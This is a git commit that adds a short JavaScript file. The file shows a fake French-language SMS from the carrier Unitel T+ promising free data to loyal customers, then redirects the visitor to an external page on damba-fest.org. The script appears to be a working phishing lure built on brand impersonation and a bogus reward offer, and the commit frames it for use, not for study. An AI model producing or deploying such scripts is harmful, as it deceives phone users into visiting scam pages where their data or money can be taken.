1cce41ef9a53391dab97f494ac0a70ca01af40f0
boss-bloq <nsisboy01@gmail.com>
2024-06-14 04:13:28 -0700

    Create unitel.t-activation.js

---
+++ unitel.t-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('UNITEL T+ SMS: Cher client, veuillez vérifier si votre carte SIM Unitel T+ est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://damba-fest.org/unitel.t.html';
+}
